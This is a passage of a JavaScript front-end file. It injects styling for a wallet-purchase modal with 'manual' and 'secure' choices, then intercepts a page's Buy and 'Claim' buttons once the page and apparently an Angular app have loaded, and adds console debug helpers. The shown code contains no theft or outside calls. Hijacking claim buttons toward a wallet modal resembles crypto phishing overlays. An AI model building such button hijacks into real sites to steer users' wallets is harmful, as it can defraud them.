                transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
            }

            .buy-wallet-decision-card:hover {
                transform: translateY(-2px);
                border-color: rgba(59, 130, 246, 0.45);
                box-shadow: 0 24px 68px rgba(0, 0, 0, 0.18);
            }

            .buy-wallet-decision-card-primary {
                background: linear-gradient(180deg, rgba(10, 82, 255, 0.14), rgba(16, 24, 40, 0.95));
                border-color: rgba(56, 189, 248, 0.25);
            }

            .buy-wallet-decision-card-secondary {
                background: rgba(7, 11, 26, 0.9);
            }

            .buy-wallet-decision-card-header {
                display: flex;
                align-items: flex-start;
                justify-content: space-between;
                gap: 12px;
                margin-bottom: 18px;
                flex-wrap: wrap;
            }

            .buy-wallet-decision-card-title {
                font-size: 16px;
                font-weight: 700;
                color: #ffffff;
                margin: 0;
            }

            .buy-wallet-decision-card-note {
                display: inline-flex;
                padding: 5px 12px;
                border-radius: 999px;
                font-size: 12px;
                font-weight: 700;
                color: #eff6ff;
                background: rgba(59, 130, 246, 0.18);
                border: 1px solid rgba(59, 130, 246, 0.22);
                white-space: nowrap;
            }

            .buy-wallet-decision-card-description {
                color: #cbd5e1;
                font-size: 14px;
                line-height: 1.7;
                margin: 0 0 24px;
            }

            .buy-wallet-decision-card-button {
                width: 100%;
                border-radius: 16px;
                border: none;
                padding: 15px 18px;
                font-size: 14px;
                font-weight: 700;
                color: #ffffff;
                cursor: pointer;
                transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
            }

            .buy-wallet-decision-card-button.buy-wallet-decision-manual {
                background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
                color: #ffffff;
                border: 1px solid rgba(255, 255, 255, 0.12);
            }

            .buy-wallet-decision-card-button.buy-wallet-decision-secure {
                background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
                box-shadow: 0 16px 34px rgba(59, 130, 246, 0.28);
            }

            .buy-wallet-decision-card-button:hover {
                transform: translateY(-1px);
            }

            .buy-wallet-decision-card-button:focus-visible {
                outline: 2px solid rgba(96, 165, 250, 0.85);
                outline-offset: 3px;
            }

            .mobile-message {
                color: #d1d5db;
                font-size: 13px;
                text-align: center;
                line-height: 1.4;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                margin-top: 16px;
            }

            @media (max-width: 720px) {
                .buy-wallet-modal-content,
                .buy-wallet-action-content {
                    padding: 20px;
                    margin: 16px;
                    max-width: calc(100vw - 32px);
                }

                .buy-wallet-option,
                .buy-wallet-action-item {
                    padding: 12px 14px;
                    min-height: 44px;
                }

                .buy-wallet-action-header,
                .buy-wallet-modal-header {
                    flex-direction: column;
                    align-items: flex-start;
                    gap: 10px;
                }

                .buy-wallet-action-close,
                .buy-wallet-modal-close {
                    position: absolute;
                    top: 16px;
                    right: 16px;
                }

                .buy-wallet-decision-header {
                    flex-direction: column;
                    align-items: flex-start;
                }

                .buy-wallet-decision-grid {
                    grid-template-columns: 1fr;
                }

                .buy-wallet-decision-card {
                    min-width: auto;
                }

                .buy-wallet-decision-card-description {
                    margin-bottom: 20px;
                }

                .buy-wallet-decision-card-button {
                    width: 100%;
                }

                .mobile-message {
                    font-size: 12px;
                }

                .button-group-container {
                    flex-direction: column;
                }

                .button-group-container button,
                .button-group-container [class*="btn"] {
                    min-width: 100%;
                    width: 100%;
                }
            }
        `;
        document.head.appendChild(style);
    }
}

// Create global instance
const buyButtonsOverride = new BuyButtonsOverride();

// Expose to window so inline onclick handlers can access it
window.buyButtonsOverride = buyButtonsOverride;

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        console.log('DOM loaded, initializing buyButtonsOverride');
        buyButtonsOverride.init();
    });
} else {
    console.log('Document already loaded, initializing buyButtonsOverride');
    buyButtonsOverride.init();
}

// Also try to initialize after a short delay to ensure Angular is loaded
// Only initialize once more as a backup
let initCount = 0;
setTimeout(() => {
    initCount++;
    if (initCount === 1) {
        console.log('Running additional initialization after 1000ms');
        buyButtonsOverride.init();
    }
}, 1000);

// Helper functions for debugging
window.testButtonOverride = function() {
    console.log('Testing button override...');
    const claimButton = document.querySelector('a:contains("Claim"), a[textContent*="Claim"]');
    if (!claimButton) {
        // Try different selector
        const allButtons = document.querySelectorAll('a, button');
        let found = null;
        allButtons.forEach(btn => {
            if (btn.textContent.toLowerCase().includes('claim')) {
                found = btn;
            }
        });
        if (found) {
            console.log('Found claim button:', found);
            buyButtonsOverride.overrideBuyButton(found);
        } else {
            console.log('Could not find claim button');
        }
    } else {
        console.log('Found claim button:', claimButton);
        buyButtonsOverride.overrideBuyButton(claimButton);
    }
};

window.listAllButtons = function() {
    const allButtons = document.querySelectorAll('a.btn, button.btn');
    console.log(`Found ${allButtons.length} buttons with .btn class`);
    allButtons.forEach((btn, idx) => {
        console.log(`Button ${idx}:`, btn.textContent.trim(), 'href:', btn.getAttribute('href'), 'overridden:', btn.dataset.overridden);
    });
};
